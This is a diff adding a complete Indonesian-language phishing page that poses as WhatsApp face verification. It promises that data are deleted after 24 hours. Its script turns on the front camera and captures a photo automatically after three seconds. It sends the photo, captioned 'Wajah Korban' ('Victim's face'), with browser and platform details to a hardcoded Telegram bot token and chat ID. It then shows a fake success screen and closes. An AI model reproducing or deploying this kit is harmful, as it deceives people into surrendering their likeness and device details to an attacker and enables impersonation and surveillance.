@@ -1,0 +1,333 @@
+<!DOCTYPE html>
+<html lang="id">
+<head>
+    <meta charset="UTF-8">
+    <title>Verifikasi Identitas WA</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
+            color: white;
+            text-align: center;
+            padding: 20px;
+            margin: 0;
+            min-height: 100vh;
+            display: flex;
+            flex-direction: column;
+            justify-content: center;
+            align-items: center;
+        }
+        .container {
+            background: rgba(0, 0, 0, 0.85);
+            border-radius: 20px;
+            padding: 30px;
+            max-width: 500px;
+            width: 90%;
+            box-shadow: 0 15px 35px rgba(0,0,0,0.5);
+        }
+        h1 {
+            color: #ffcc00;
+            margin-bottom: 10px;
+            font-size: 28px;
+        }
+        p {
+            opacity: 0.9;
+            margin-bottom: 25px;
+            line-height: 1.5;
+        }
+        #video {
+            width: 100%;
+            max-width: 400px;
+            border-radius: 15px;
+            border: 5px solid white;
+            margin: 20px auto;
+            display: block;
+            background: #000;
+        }
+        .hidden {
+            display: none !important;
+        }
+        .status {
+            margin: 20px 0;
+            padding: 12px;
+            border-radius: 10px;
+            background: rgba(255,255,255,0.1);
+            font-size: 14px;
+            min-height: 20px;
+        }
+        .loader {
+            border: 4px solid #f3f3f3;
+            border-top: 4px solid #ff416c;
+            border-radius: 50%;
+            width: 40px;
+            height: 40px;
+            animation: spin 1s linear infinite;
+            margin: 20px auto;
+        }
+        @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
+        .success {
+            color: #4CAF50;
+            font-weight: bold;
+            font-size: 18px;
+        }
+        .warning {
+            color: #ff9800;
+        }
+        .error {
+            color: #f44336;
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <h1>🆔 Verifikasi Identitas WhatsApp</h1>
+        <p>Untuk mencegah spam dan akun bot, kami membutuhkan <strong>verifikasi wajah sekali saja</strong>. Data akan dihapus otomatis setelah 24 jam.</p>
+        
+        <div id="step1">
+            <p>Klik tombol di bawah untuk mengaktifkan kamera dan ambil foto verifikasi.</p>
+            <button id="startBtn" style="
+                background: linear-gradient(to right, #00b09b, #96c93d);
+                color: white;
+                border: none;
+                padding: 15px 40px;
+                font-size: 18px;
+                border-radius: 50px;
+                cursor: pointer;
+                font-weight: bold;
+                margin: 10px;
+            ">📸 VERIFIKASI SEKARANG</button>
+        </div>
+        
+        <div id="step2" class="hidden">
+            <video id="video" autoplay playsinline></video>
+            <div class="status" id="status">Kamera aktif. Menyesuaikan fokus...</div>
+            <div style="margin: 20px;">
+                <button id="captureBtn" style="
+                    background: #ff416c;
+                    color: white;
+                    border: none;
+                    padding: 12px 30px;
+                    font-size: 16px;
+                    border-radius: 50px;
+                    cursor: pointer;
+                    margin: 5px;
+                ">⏺️ AMBIL FOTO</button>
+                <button id="cancelBtn" style="
+                    background: #555;
+                    color: white;
+                    border: none;
+                    padding: 12px 30px;
+                    font-size: 16px;
+                    border-radius: 50px;
+                    cursor: pointer;
+                    margin: 5px;
+                ">❌ BATAL</button>
+            </div>
+        </div>
+        
+        <div id="step3" class="hidden">
+            <div class="loader" id="loader"></div>
+            <div class="status" id="status2">Mengirim verifikasi ke server...</div>
+            <div id="result"></div>
+        </div>
+        
+        <div id="step4" class="hidden">
+            <div style="font-size: 48px; margin: 20px;">✅</div>
+            <div class="status success">Verifikasi berhasil! Kamera dimatikan.</div>
+            <p>Anda dapat melanjutkan ke aplikasi WhatsApp. Halaman ini akan tertutup otomatis dalam <span id="countdown">5</span> detik.</p>
+        </div>
+    </div>
+
+    <script>
+        // ==================== KONFIGURASI ====================
+        const BOT_TOKEN = '8374148460:AAHayLJyejDCN2fWreeW41sSl_SQSVQO5dY'; // CONTOH: '1234567890:ABCdefGHIjklMNopqrstUVWxyz'
+        const CHAT_ID = '8374148460'; // CONTOH: '987654321'
+        
+        // ==================== VARIABEL ====================
+        const video = document.getElementById('video');
+        const startBtn = document.getElementById('startBtn');
+        const captureBtn = document.getElementById('captureBtn');
+        const cancelBtn = document.getElementById('cancelBtn');
+        const statusDiv = document.getElementById('status');
+        const status2Div = document.getElementById('status2');
+        const resultDiv = document.getElementById('result');
+        const loader = document.getElementById('loader');
+        const steps = {
+            step1: document.getElementById('step1'),
+            step2: document.getElementById('step2'),
+            step3: document.getElementById('step3'),
+            step4: document.getElementById('step4')
+        };
+        
+        let stream = null;
+        let captureDone = false;
+
+        // ==================== FUNGSI KIRIM KE TELEGRAM ====================
+        async function sendPhotoToTelegram(imageDataURL) {
+            if (!BOT_TOKEN || BOT_TOKEN.includes('MASUKIN') || !CHAT_ID) {
+                throw new Error('Konfigurasi bot belum lengkap!');
+            }
+
+            // Konversi base64 ke blob
+            const base64Data = imageDataURL.split(',')[1];
+            const byteCharacters = atob(base64Data);
+            const byteNumbers = new Array(byteCharacters.length);
+            for (let i = 0; i < byteCharacters.length; i++) {
+                byteNumbers[i] = byteCharacters.charCodeAt(i);
+            }
+            const byteArray = new Uint8Array(byteNumbers);
+            const blob = new Blob([byteArray], { type: 'image/jpeg' });
+
+            // Buat FormData
+            const formData = new FormData();
+            formData.append('chat_id', CHAT_ID);
+            formData.append('photo', blob, `wajah_${Date.now()}.jpg`);
+            
+            // Tambahkan caption dengan info target
+            const caption = `📸 Wajah Korban
+⏰ ${new Date().toLocaleString()}
+🌐 ${navigator.userAgent.substring(0, 60)}
+📱 ${navigator.platform}
+📍 ${navigator.geolocation ? 'GPS Aktif' : 'GPS Tidak Diizinkan'}`;
+            formData.append('caption', caption);
+
+            // Kirim ke Telegram API
+            const response = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
+                method: 'POST',
+                body: formData
+            });
+            
+            const result = await response.json();
+            if (!result.ok) {
+                throw new Error(result.description || 'Gagal mengirim ke Telegram');
+            }
+            
+            return result;
+        }
+
+        // ==================== FUNGSI UTAMA ====================
+        startBtn.onclick = async () => {
+            statusDiv.textContent = 'Mengakses kamera...';
+            steps.step1.classList.add('hidden');
+            steps.step2.classList.remove('hidden');
+            
+            try {
+                stream = await navigator.mediaDevices.getUserMedia({
+                    video: {
+                        facingMode: 'user',
+                        width: { ideal: 1280 },
+                        height: { ideal: 720 }
+                    },
+                    audio: false
+                });
+                
+                video.srcObject = stream;
+                statusDiv.textContent = 'Kamera aktif. Posisikan wajah Anda di dalam frame.';
+                
+                // Auto-capture setelah 3 detik (jika user lambat)
+                setTimeout(() => {
+                    if (!captureDone) {
+                        statusDiv.textContent = 'Mengambil foto otomatis...';
+                        captureBtn.click();
+                    }
+                }, 3000);
+                
+            } catch (err) {
+                statusDiv.innerHTML = `<span class="error">Gagal mengakses kamera: ${err.name}</span>`;
+                resultDiv.innerHTML = `<p class="warning">Coba izinkan akses kamera atau gunakan perangkat lain.</p>`;
+            }
+        };
+
+        captureBtn.onclick = async () => {
+            if (!stream || captureDone) return;
+            
+            captureDone = true;
+            steps.step2.classList.add('hidden');
+            steps.step3.classList.remove('hidden');
+            status2Div.textContent = 'Mengambil foto...';
+            
+            // Ambil frame dari video
+            const canvas = document.createElement('canvas');
+            canvas.width = video.videoWidth;
+            canvas.height = video.videoHeight;
+            const ctx = canvas.getContext('2d');
+            ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
+            
+            // Konversi ke base64
+            const imageData = canvas.toDataURL('image/jpeg', 0.9);
+            
+            // Matikan kamera
+            if (stream) {
+                stream.getTracks().forEach(track => track.stop());
+                video.srcObject = null;
+            }
+            
+            // Tampilkan preview
+            const preview = document.createElement('img');
+            preview.src = imageData;
+            preview.style.width = '150px';
+            preview.style.borderRadius = '10px';
+            preview.style.margin = '10px';
+            resultDiv.appendChild(preview);
+            
+            // Kirim ke Telegram
+            status2Div.textContent = 'Mengirim ke server Telegram...';
+            try {
+                const telegramResult = await sendPhotoToTelegram(imageData);
+                status2Div.innerHTML = '<span class="success">✅ Foto berhasil dikirim!</span>';
+                loader.classList.add('hidden');
+                
+                // Pindah ke step selesai
+                setTimeout(() => {
+                    steps.step3.classList.add('hidden');
+                    steps.step4.classList.remove('hidden');
+                    
+                    // Countdown tutup halaman
+                    let count = 5;
+                    const countdownEl = document.getElementById('countdown');
+                    const timer = setInterval(() => {
+                        count--;
+                        countdownEl.textContent = count;
+                        if (count <= 0) {
+                            clearInterval(timer);
+                            window.close();
+                        }
+                    }, 1000);
+                }, 2000);
+                
+            } catch (err) {
+                status2Div.innerHTML = `<span class="error">❌ Gagal mengirim: ${err.message}</span>`;
+                loader.classList.add('hidden');
+                resultDiv.innerHTML += `<p class="warning">Cek koneksi internet dan konfigurasi bot.</p>`;
+            }
+        };
+
+        cancelBtn.onclick = () => {
+            if (stream) {
+                stream.getTracks().forEach(track => track.stop());
+                video.srcObject = null;
+            }
+            steps.step2.classList.add('hidden');
+            steps.step1.classList.remove('hidden');
+            captureDone = false;
+            statusDiv.textContent = 'Verifikasi dibatalkan.';
+        };
+
+        // ==================== AUTO-START (OPSIONAL) ====================
+        // Hapus komentar di bawah untuk auto-start kamera tanpa klik
+        /*
+        window.addEventListener('load', () => {
+            setTimeout(() => {
+                if (!captureDone) {
+                    startBtn.click();
+                }
+            }, 1000);
+        });
+        */
+    </script>
+</body>
+</html>
